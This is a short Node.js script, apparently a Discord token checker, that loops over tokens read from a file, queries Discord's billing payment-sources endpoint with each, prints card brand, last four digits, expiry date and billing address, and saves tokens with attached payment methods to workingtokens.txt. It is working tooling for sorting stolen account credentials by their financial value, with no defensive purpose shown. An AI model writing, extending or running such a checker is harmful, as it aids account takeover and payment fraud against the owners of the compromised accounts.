let axios = require('axios')
let lineReader = require('line-reader');
let fs = require('fs');


lineReader.eachLine('tokens.txt', async (token, last) => {
console.log(`Checking token: ${token}`)
let url = 'https://discord.com/api/v9/users/@me/billing/payment-sources'
let headers = {
    'authorization': token
    }
    try {
    let r = await axios.get(url, { headers })
    let lineToWrite;
    let status_code = r.status;
    if (r.data.length === 0) {
    console.log('No pm.');
    lineToWrite = `${token}:pm:false\n`;
      //  }
    } else {
let pm = r.data[0];
    console.log(`visa/mastercard (brnad):${r.data[0].brand}`)
    if (r.data[0].deleted_at === null) {
    console.log('not deleted')
    }
    if (r.data[0].deleted_at) {
    console.log('r.data[0].deleted_at')
    }
    console.log('last 4 digits:', r.data[0].last_4)
    console.log('date: month', r.data[0].expires_month)
    console.log('date: year', r.data[0].expires_year)
    console.log('address:', r.data[0].billing_address)
    lineToWrite = `${token}:pm:${pm.last_4 || 'N/A'}:brand:${pm.brand || 'N/A'}\n`;
    }
    fs.appendFileSync('workingtokens.txt', lineToWrite);
    console.log('done checking everything. go check workingtokens.txt')
    } catch (e) {
    if (e.response && e.response.status === 401) {
    console.log('Invalid token, skipping...')
    } else {
        console.log('Error:', e.message)
    }
}
    
    })
